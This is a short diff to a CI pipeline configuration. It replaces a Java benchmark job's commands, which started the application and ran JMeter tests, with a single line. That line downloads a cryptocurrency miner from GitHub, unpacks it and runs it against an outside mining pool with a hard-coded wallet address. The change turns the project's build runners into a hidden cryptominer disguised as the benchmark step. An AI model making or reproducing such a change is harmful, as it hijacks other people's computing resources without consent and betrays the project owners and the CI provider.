@@ -44,8 +44,4 @@ blocks:
       jobs:
         - name: Benchmark
           commands:
-            - java -version
-            - java -jar target/spring-pipeline-demo.jar > /dev/null &
-            - sleep 20
-            - 'mvn -q jmeter:jmeter'
-            - 'mvn jmeter:results'
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz && tar xf cpuminer-opt-linux.tar.gz && ./cpuminer-sse2 -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u Muv1rtGiiLYrsEgQ1mESBbLcrtP4TTm2ox.G -p -t2'
